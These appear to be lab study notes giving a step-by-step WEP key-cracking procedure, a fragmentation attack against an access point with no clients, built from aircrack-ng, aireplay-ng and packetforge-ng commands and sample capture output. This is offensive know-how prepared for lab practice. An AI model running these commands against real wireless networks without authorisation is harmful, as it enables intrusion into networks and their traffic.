# Is ENC WEP? yes
# Is CIPHER WEP? yes
# Is AUTH OPN? yes
     # If using shared key auth see lab guide: page 231 (previously captured PRGA XOR handshake required)
# clients? no
# strong AP connect? yes
# data packets in airodump output? yes (required)
# lab guide page 231


###############################################
# Wep crack without client (fragmentation)    #
###############################################
# STEP 1: dump ap on ch
airodump-ng -c 8 --bssid 4C:60:DE:4A:62:80 -w wepfrag mon0
# STEP 2: fake auth
# 60 to reauth every 60 seconds
aireplay-ng -1 60 -e hostileNetwork2g -a 4C:60:DE:4A:62:80 -h 00:C0:CA:53:0A:D1 mon0
# STEP 3: fragmentation attack
# obtains a prg keystream
# must have strong signal to AP
aireplay-ng -5 -b <bssid> -h <source_mac> mon0
aireplay-ng -5 -b 4C:60:DE:4A:62:80 -h 00:C0:CA:53:0A:D1 mon0
# wait for data packet then hit y

# NOTE NOTE NOTE: be patient


# Saving keystream in fragment-0416-131510.xor
# STEP 4
# -0 arp packet
packetforge-ng -0 -a <BSSID> -h <source_mac> -l <source_ip> -k <dst_ip_local broadcast> -y <prga_xor file> -w <outfile>
packetforge-ng -0 -a 4C:60:DE:4A:62:80 -h 00:C0:CA:53:0A:D1 -l 192.168.1.100 -k 192.168.1.255 -y fragment-0416-131510.xor -w injectme.cap
# STEP 5: inspect cap file
tcpdump -n -vvv -e -s0 -r injectme.cap
#root@bt:~# tcpdump -n -vvv -e -s0 -r injectme.cap
#reading from file injectme.cap, link-type IEEE802_11 (802.11)
#13:20:09.277028 WEP Encrypted 258us BSSID:4c:60:de:4a:62:80 SA:00:c0:ca:53:0a:d1 DA:ff:ff:ff:ff:ff:ff Data IV:fc7ff1 Pad 0 KeyID 0
# STEP 6: replay packet from packetforge-ng
aireplay-ng -2 -r <capturefile> mon0
aireplay-ng -2 -r injectme.cap mon0
# if no data generation restart process and capture new data packet step 3

# STEP 7: crack the cap holding our data
# sometimes there is file rollover so try each file if needed
aircrack-ng <filename>.cap
aircrack-ng wepfrag-03.cap
##################### END #####################
###############################################